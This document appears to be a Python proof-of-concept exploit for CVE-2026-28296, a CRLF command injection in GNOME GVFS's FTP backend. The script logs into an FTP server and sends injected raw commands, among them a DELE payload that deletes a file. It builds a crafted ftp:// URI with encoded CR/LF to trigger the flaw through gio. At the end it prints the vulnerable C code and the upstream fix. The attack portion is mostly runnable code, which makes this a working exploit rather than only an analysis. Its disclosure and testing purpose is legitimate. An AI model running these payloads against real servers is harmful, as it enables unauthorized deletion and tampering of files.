#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : GVFS FTP Backend CRLF Command Injection
# CVE            : CVE-2026-28296
# Vendor         : GNOME
# Product        : GVFS (gvfs)
# Affected       : All versions <= 1.58.1 (fixed in commit 21dda190)
# Type           : CWE-93 - CRLF Injection
# CVSS           : 4.3 (Medium)
# Platform       : Linux
# Author         : Exploit Intelligence Platform (dev@exploit-intel.com)
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-26
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2026-28296 - GVFS FTP Backend CRLF Command Injection PoC
=============================================================

The GVFS FTP backend (gvfsftpfile.c) does not sanitize CR/LF characters
in file paths before constructing FTP commands. When a path like
"/file\\r\\nDELE /secret.txt" is passed to g_vfs_ftp_file_new_from_gvfs(),
it flows unsanitized into g_vfs_ftp_task_sendv() which builds:

    RETR /file\\r\\n
    DELE /secret.txt\\r\\n

The FTP server sees two separate commands.

This PoC demonstrates the injection by using GIO (via gvfs) to access
a crafted FTP URI. A parallel tcpdump/ncat capture shows the injected
commands on the wire.
"""

import subprocess
import sys
import time
import os
import socket

FTP_HOST = os.environ.get("FTP_HOST", "ftpserver")
FTP_PORT = int(os.environ.get("FTP_PORT", "21"))
FTP_USER = os.environ.get("FTP_USER", "ftpuser")
FTP_PASS = os.environ.get("FTP_PASS", "ftpuser")


def banner():
    print("=" * 65)
    print("  CVE-2026-28296 - GVFS FTP CRLF Command Injection PoC")
    print("  Exploit Intelligence Platform | exploit-intel.com")
    print("=" * 65)
    print()


def wait_for_ftp():
    """Wait until the FTP server is reachable."""
    print(f"[*] Waiting for FTP server at {FTP_HOST}:{FTP_PORT} ...")
    for _ in range(30):
        try:
            s = socket.create_connection((FTP_HOST, FTP_PORT), timeout=2)
            s.close()
            print("[+] FTP server is up.")
            return True
        except (ConnectionRefusedError, OSError):
            time.sleep(1)
    print("[-] FTP server not reachable. Exiting.")
    return False


def raw_ftp_demo():
    """
    Demonstrates the CRLF injection at the FTP protocol level.
    Connects to the FTP server and sends a crafted RETR command
    that contains an injected STAT command.
    """
    print("[*] === Raw FTP Protocol Demonstration ===")
    print("[*] Connecting to FTP server...")

    s = socket.create_connection((FTP_HOST, FTP_PORT), timeout=10)
    banner_line = s.recv(1024).decode(errors="replace")
    print(f"    Server: {banner_line.strip()}")

    def ftp_cmd(cmd):
        s.sendall((cmd + "\r\n").encode())
        time.sleep(0.3)
        resp = s.recv(4096).decode(errors="replace")
        for line in resp.strip().split("\n"):
            print(f"    < {line.strip()}")
        return resp

    ftp_cmd(f"USER {FTP_USER}")
    ftp_cmd(f"PASS {FTP_PASS}")
    ftp_cmd("TYPE I")

    # This is what GVFS would send when given a path with CRLF:
    # The intended command is: RETR /public/readme.txt
    # But with CRLF injection: RETR /public/readme.txt\r\nSTAT\r\n
    # The server processes RETR, then STAT as a separate command.

    print()
    print("[*] Sending normal RETR command:")
    print('    > RETR /home/ftpuser/public/readme.txt')
    ftp_cmd("RETR /home/ftpuser/public/readme.txt")

    print()
    print("[*] Now simulating CRLF injection (as GVFS would send it):")
    print("[*] The crafted path: /home/ftpuser/public/readme.txt\\r\\nSTAT")
    print("[*] This becomes TWO FTP commands on the wire:")
    print('    > RETR /home/ftpuser/public/readme.txt')
    print('    > STAT')
    print()

    # Send the injected payload - note: we send it as a single write,
    # exactly as GVFS would via g_vfs_ftp_connection_send()
    injected = "RETR /home/ftpuser/public/readme.txt\r\nSTAT\r\n"
    s.sendall(injected.encode())
    time.sleep(1)
    resp = s.recv(8192).decode(errors="replace")
    for line in resp.strip().split("\n"):
        print(f"    < {line.strip()}")

    print()

    # More dangerous example: injecting DELE
    print("[*] Dangerous injection example (DELE command):")
    print("[*] Crafted path: /home/ftpuser/public/readme.txt\\r\\nDELE /home/ftpuser/secret.txt")
    print("[*] This would delete secret.txt on the server!")
    print()

    injected_dele = "RETR /home/ftpuser/public/readme.txt\r\nDELE /home/ftpuser/secret.txt\r\n"
    s.sendall(injected_dele.encode())
    time.sleep(1)
    resp = s.recv(8192).decode(errors="replace")
    for line in resp.strip().split("\n"):
        print(f"    < {line.strip()}")

    ftp_cmd("QUIT")
    s.close()


def gvfs_demo():
    """
    Demonstrates the vulnerability through the actual GVFS stack.
    Uses gio/gvfs-cat to trigger the vulnerable code path.
    """
    print()
    print("[*] === GVFS Stack Demonstration ===")
    print()

    # Check if gvfs tools are available
    gvfs_tools = ["gio", "gvfs-cat", "gvfs-ls"]
    available_tool = None
    for tool in gvfs_tools:
        try:
            subprocess.run([tool, "--help"], capture_output=True, timeout=5)
            available_tool = tool
            break
        except (FileNotFoundError, subprocess.TimeoutExpired):
            continue

    if available_tool is None:
        print("[!] No GVFS CLI tools found. Showing code-level analysis only.")
        print()
        print("[*] The vulnerability is in daemon/gvfsftpfile.c:")
        print()
        print("    GVfsFtpFile *")
        print("    g_vfs_ftp_file_new_from_gvfs (GVfsBackendFtp *ftp,")
        print("                                   const char *gvfs_path)")
        print("    {")
        print("      // NO validation of gvfs_path for CR/LF characters!")
        print("      file->gvfs_path = g_strdup (gvfs_path);")
        print("      file->ftp_path = g_vfs_ftp_file_compute_ftp_path (gvfs_path);")
        print("      return file;")
        print("    }")
        print()
        print("[*] Then in do_open_for_read (gvfsbackendftp.c):")
        print()
        print('    file = g_vfs_ftp_file_new_from_gvfs (ftp, filename);')
        print('    g_vfs_ftp_task_send_and_check (&task, ...,')
        print('        "RETR %s", g_vfs_ftp_file_get_ftp_path (file));')
        print()
        print("[*] In g_vfs_ftp_task_sendv (gvfsftptask.c:660-662):")
        print()
        print('    command = g_string_new ("");')
        print('    g_string_append_vprintf (command, format, varargs);')
        print('    g_string_append (command, "\\r\\n");')
        print()
        print("[*] If filename = '/test\\r\\nDELE /secret.txt',")
        print("    the command buffer becomes:")
        print('    "RETR /test\\r\\nDELE /secret.txt\\r\\n"')
        print()
        print("[*] The FTP server sees two commands:")
        print("    1. RETR /test")
        print("    2. DELE /secret.txt")
        return

    print(f"[+] Found GVFS tool: {available_tool}")

    # Construct a malicious FTP URI with CRLF in the path
    # The %0d%0a is URL-encoded \r\n
    malicious_uri = (
        f"ftp://{FTP_USER}:{FTP_PASS}@{FTP_HOST}/"
        f"home/ftpuser/public/readme.txt%0d%0aSTAT"
    )

    print(f"[*] Malicious URI: {malicious_uri}")
    print(f"[*] Attempting to access via {available_tool}...")
    print()

    try:
        result = subprocess.run(
            [available_tool, "cat", malicious_uri] if available_tool == "gio"
            else [available_tool, malicious_uri],
            capture_output=True,
            text=True,
            timeout=15
        )
        print(f"    stdout: {result.stdout[:500]}")
        print(f"    stderr: {result.stderr[:500]}")
    except subprocess.TimeoutExpired:
        print("[!] Command timed out (expected if FTP session hangs).")
    except Exception as e:
        print(f"[!] Error: {e}")


def show_fix():
    """Show the fix that was applied."""
    print()
    print("[*] === Fix (commit 21dda190) ===")
    print()
    print("    The fix adds CRLF validation in g_vfs_ftp_file_new_from_gvfs():")
    print()
    print('    if (strpbrk (gvfs_path, "\\r\\n") != NULL)')
    print("      {")
    print("        g_set_error_literal (error,")
    print("            G_IO_ERROR, G_IO_ERROR_INVALID_FILENAME,")
    print('            _("Filename contains invalid characters."));')
    print("        return NULL;")
    print("      }")
    print()
    print("[*] All callers were updated to check for NULL return and")
    print("    propagate the error instead of proceeding with the FTP command.")
    print()


if __name__ == "__main__":
    banner()

    if not wait_for_ftp():
        sys.exit(1)

    raw_ftp_demo()
    gvfs_demo()
    show_fix()

    print("[*] PoC complete.")
